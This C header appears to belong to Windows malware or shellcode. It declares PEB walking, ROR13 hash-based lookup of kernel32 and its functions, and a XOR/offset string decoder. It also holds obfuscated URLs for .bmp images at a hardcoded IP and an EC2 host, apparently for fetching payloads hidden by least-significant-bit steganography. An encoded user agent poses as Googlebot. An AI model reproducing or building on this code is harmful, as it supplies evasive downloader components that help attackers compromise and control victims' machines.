#ifndef _UTILS_H_
	#define _UTILS_H_

#include "Defines.h"

#include <winternl.h>

PPEB get_peb(void);

DWORD __stdcall unicode_ror13_hash(const WCHAR *unicode_string);
DWORD __stdcall ror13_hash(const char *string);

HMODULE __stdcall find_kernel32(void);
HMODULE __stdcall find_module_by_hash(DWORD hash);
FARPROC __stdcall find_function(HMODULE module, DWORD hash);

void __cdecl memcpy(PVOID dest, PVOID src, DWORD dwSize);
void __cdecl memset(PVOID pMem, DWORD dwLength, UCHAR value);

void * resize(PVOID pBuf, DWORD dwCurrentSize, DWORD dwNewSize);

char tolower(char ch);
char * tolower(char * pString, DWORD dwLength);

WCHAR tolower(WCHAR ch);
WCHAR * tolower(WCHAR * pwString, DWORD dwLength);

DWORD length(char * pString);
DWORD length(WCHAR * pwString);

#define DECODE_CHAR(ch, key, offset) \
        ( (ch - offset) ^ key )

char * decode(char * buf, int length, unsigned char key, unsigned char offset);

// -- http://10.248.187.21/security.bmp -- //
#define LSB_TARGET_URL ( decode(\
        "\x6a\x6e\x6e\x72\x38\x25\x25\x33\x32\x24\x30\x2e\x3a\x24\x33\x3a\x2d\x24\x30\x33"\
        "\x25\x71\x5f\x61\x6f\x70\x6b\x6e\x7b\x24\x60\x67\x72", 33, 0x86, 0x7C) )

// -- http://10.248.187.21/clear.bmp -- //
/*#define LSB_TARGET_URL ( decode(\
        "\xfd\xf1\xf1\xf5\x2b\x38\x38\x36\x35\x37\x33\x31\x2d\x37\x36\x2d\x30\x37\x33\x36"\
        "\x38\x04\xf9\x02\x06\xf3\x37\x03\xfa\xf5", 30, 0xDE, 0x47) )*/


// -- http://10.248.187.21/ssl.bmp -- //
/* #define LSB_TARGET_URL ( decode(\
        "\x7c\x98\x98\x94\xca\xbf\xbf\xd5\xd4\xbe\xd2\xd8\xcc\xbe\xd5\xcc\xd7\xbe\xd2\xd5"\
        "\xbf\x93\x93\x80\xbe\x82\x81\x94", 28, 0xCA, 0xDA) ) */

// -- http://ec2-54-85-174-185.compute-1.amazonaws.com/cat.bmp -- //
/* #define LSB_TARGET_URL ( decode(\
        "\xf2\xee\xee\xea\x20\x33\x33\xfd\xf7\x28\x35\x2d\x2e\x35\x22\x2d\x35\x29\x2b\x2e"\
        "\x35\x29\x22\x2d\x34\xf7\xf3\xf5\xea\xed\xee\xfd\x35\x29\x34\xf9\xf5\xf9\xe0\xf3"\
        "\xf4\xf9\xeb\xe7\x34\xf7\xf3\xf5\x33\xf7\xf9\xee\x34\xf8\xf5\xea", 56, 0x7B, 0xDF) ) */

// -- Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) -- //
#define USER_AGENT ( decode(\
        "\xa2\x84\x71\x7e\x83\x83\x86\xc4\xba\xc5\xb7\xc7\xbf\x88\x84\x82\x77\x86\x7b\x7e"\
        "\x89\x83\x8a\xb0\xc7\xac\x84\x84\x8c\x83\x8a\x89\x84\x7b\xc4\xb9\xc5\xb6\xb0\xc7"\
        "\xc0\x7f\x7b\x7b\x77\xb1\xc4\xc4\x7c\x7c\x7c\xc5\x8c\x84\x84\x8c\x83\x8a\xc5\x88"\
        "\x84\x82\xc4\x89\x84\x7b\xc5\x7f\x7b\x82\x83\xbe", 72, 0xF9, 0xEE) )

#endif